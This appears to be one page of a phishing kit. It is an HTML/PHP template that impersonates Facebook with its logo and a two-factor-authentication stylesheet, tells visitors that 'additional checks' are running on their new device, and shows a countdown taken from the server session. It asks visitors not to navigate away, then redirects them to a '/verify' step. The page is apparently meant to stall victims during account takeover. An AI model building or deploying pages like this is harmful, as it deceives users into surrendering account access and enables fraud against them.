
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
    <link rel="stylesheet" href="./assets/css/twofa.css">
    <link href="./assets/css/boxicons.min.css" rel="stylesheet">

    <title>Facebook</title>
    <style>
        .box {
            text-align: center !important;
            border: none !important;
            background: transparent !important;
        }
        .bx-spin {
            font-size: 34px;
            color: #3578ea;
        }
        .mm {
            height: 100% !important;
        }
        .imglike {
            width: 50%;
        }
    </style>
</head>
<body>
<div class="navbar">
    <div class="container">
        <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
    </div>
</div>
<div class="mm">
    <div class="box">
        <div class="box_content">
            <h3 style="color: #000000cc !important;">This action is not currently available.</h3>
            <p style="color:#00000080 !important;font-weight:500;">
                We are making additional checks on this new device. Try again in <span id="countdown"></span>.
            </p>
            <img src="./assets/img/like-bandage.png" alt="" class="imglike">
            <p id="refreshMessage" style="color:#00000080 !important;font-weight:500;">
                We kindly request that you refrain from navigating away or refreshing this page. 
                After the countdown, there will be more required steps to complete.
            </p>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        // Get the future time from PHP session and convert to ISO 8601 format compatible with all browsers
        let futureTimeString = "<?php echo $_SESSION['future_time']; ?>";
        
        // Create a Date object from the future time string, considering the time is in UTC
        let futureDate = new Date(futureTimeString.replace(' ', 'T') + 'Z');
        let futureTimestamp = futureDate.getTime(); // Convert to timestamp in milliseconds

        let countdownElement = document.getElementById("countdown");

        function updateCountdown() {
            let currentTime = Date.now(); // Current timestamp in milliseconds
            let secondsLeft = Math.floor((futureTimestamp - currentTime) / 1000); // Calculate remaining seconds

            if (secondsLeft <= 0) {
                // Time's up, redirect to the verify page
                window.location.href = "/verify";
            } else {
                let minutesLeft = Math.floor(secondsLeft / 60);
                let secondsRemaining = secondsLeft % 60; // Remaining seconds after minutes
                let timeLabel = (minutesLeft === 1) ? "minute" : "minutes";
                countdownElement.innerHTML = minutesLeft + " " + timeLabel + " " + secondsRemaining + " seconds"; // Update countdown text
            }
        }

        updateCountdown(); // Initial call
        setInterval(updateCountdown, 1000); // Update countdown every second
    });
</script>

</body>
</html>
